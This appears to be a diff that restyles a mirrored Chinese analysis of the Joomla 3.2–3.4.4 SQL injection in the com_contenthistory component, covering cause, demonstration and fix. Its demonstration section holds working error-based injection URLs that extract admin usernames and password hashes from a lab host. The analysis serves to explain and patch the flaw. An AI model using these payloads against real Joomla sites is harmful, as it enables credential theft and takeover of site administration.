@@ -3,16 +3,16 @@
 			<head>
 			     <title>Joomla CMS 3.2-3.4.4 SQL注入 漏洞分析 - RickGray</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/9979">http://drops.wooyun.org/papers/9979</a></h1>
 				
       <p>
-        <p>昨日，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。</p>
+        </p><p>昨日，Joomla CMS发布新版本3.4.5，该版本修复了一个高危的SQL注入漏洞，3.2至3.4.4版本都受到影响。攻击者通过该漏洞可以直接获取获取数据库中敏感信息，甚至可以获取已登陆的管理员会话直接进入网站后台。</p>
 
 <h1>0x01 原理分析</h1>
 
-<hr />
+<hr>
 
 <p>在 Joomla CMS 中有一个查看历史编辑版本的组件(com_contenthistory)，该功能本应只有管理员才能访问，但是由于开发人员的疏忽，导致该功能的访问并不需要相应的权限。通过访问 <code>/index.php?option=com_contenthistory</code> 可以使得服务端加载历史版本处理组件。程序流程会转到 <code>/components/com_contenthistory/contenthistory.php</code> 文件中：</p>
 
@@ -196,7 +196,7 @@ protected function populateState($ordering = null, $direction = null)
 
 <h1>0x02 漏洞演示</h1>
 
-<hr />
+<hr>
 
 <p>通过上面简单的分析，已经知道了受影响的 Joomla 版本中，<code>contenthistory</code> 组件访问不受权限的控制，并且当进行 <code>view=history</code> 请求时会解析请求参数中 <code>list[select]</code> 的值拼接到 SQL 语句中。下面是该漏洞的简单验证和利用方法。</p>
 
@@ -210,7 +210,7 @@ protected function populateState($ordering = null, $direction = null)
 
 <p>因此，访问上述构造的URL，服务器会报错：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151026/2015102603113434189112.jpg" alt="" /></p>
+<p><img src="http://static.wooyun.org//drops/20151026/2015102603113434189112.jpg" alt=""></p>
 
 <p><em>2.漏洞利用</em></p>
 
@@ -226,17 +226,17 @@ protected function populateState($ordering = null, $direction = null)
   <p>http://http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com&#95;contenthistory&amp;view=history&amp;item&#95;id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(<em>),concat((select username from %23__users limit 0,1),floor(rand(0)</em>2)) from information_schema.tables group by 2)x)</p>
 </blockquote>
 
-<p><img src="http://static.wooyun.org//drops/20151026/201510260313109957323.jpg" alt="" /></p>
+<p><img src="http://static.wooyun.org//drops/20151026/201510260313109957323.jpg" alt=""></p>
 
 <blockquote>
   <p>http://172.16.96.130/xampp/Joomla-3.4.4/index.php?option=com&#95;contenthistory&amp;view=history&amp;item&#95;id=1&amp;type_id=1&amp;list[ordering]&amp;list[select]=(select 1 from (select count(<em>),concat((select password from %23__users limit 0,1),floor(rand(0)</em>2)) from information_schema.tables group by 2)x)</p>
 </blockquote>
 
-<p><img src="http://static.wooyun.org//drops/20151026/201510260314099861138.jpg" alt="" /></p>
+<p><img src="http://static.wooyun.org//drops/20151026/201510260314099861138.jpg" alt=""></p>
 
 <h1>0x03 修复方案</h1>
 
-<hr />
+<hr>
 
 <ol>
 <li>从 <a href="https://github.com/joomla/joomla-cms/releases">https://github.com/joomla/joomla-cms/releases</a> 获取最新版本进行重新安装；</li>
@@ -245,7 +245,7 @@ protected function populateState($ordering = null, $direction = null)
 
 <h1>0x04 总结</h1>
 
-<hr />
+<hr>
 
 <p>就 Joomla CMS 的用户量来看，目前还有大量的站点的数据正受到该漏洞的威胁。该漏洞的产生本质上是由于访问控制的缺失和过滤不严格造成。访问控制的缺失导致本应只有管理员才能进行访问和加载的 <code>contenthistory</code> 组件能够被任意用户访问和加载，而参数的过滤不严格，导致攻击者能够构造出恶意的参数到执行流中产生注入。</p>
 
@@ -257,7 +257,7 @@ protected function populateState($ordering = null, $direction = null)
 <li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/">https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/</a></li>
 </ul>
 
-<p>原文地址：<a href="http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/">http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/</a></p>      </p>
+<p>原文地址：<a href="http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/">http://blog.knownsec.com/2015/10/joomla-cms-3-2-3-4-4-sql-injection-vulnerability/</a></p>      <p></p>
     
 			</body>
 		</html>
